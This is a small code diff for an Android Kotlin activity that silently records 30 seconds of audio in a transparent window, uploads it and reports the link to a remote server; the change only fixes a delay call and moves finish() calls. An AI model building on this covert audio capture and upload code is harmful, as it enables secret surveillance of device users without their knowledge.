@@ -49,7 +49,7 @@ class DummyAudioActivity : AppCompatActivity() {
             recorder.start()
 
             ctx.log().i(TAG, "Started recording audio in transparent activity...")
-            delay(30000L) // 30 seconds
+            kotlinx.coroutines.delay(30000L) // 30 seconds
 
             recorder.stop()
             recorder.release()
@@ -63,19 +63,21 @@ class DummyAudioActivity : AppCompatActivity() {
                     outputFile.delete()
                     val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                     transport.send(ctx, "Audio Captured: $link", "audio")
+                    finish()
                 },
                 onError = { error ->
                     outputFile.delete()
                     val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                     transport.send(ctx, "Failed to upload audio: $error", "audio")
+                    finish()
                 }
             )
         } catch (e: Exception) {
             ctx.log().e(TAG, "Audio recording failed: ${e.message}")
             recorder.release()
             outputFile.delete()
+            finish()
         }
-        finish()
     }
 
     companion object {
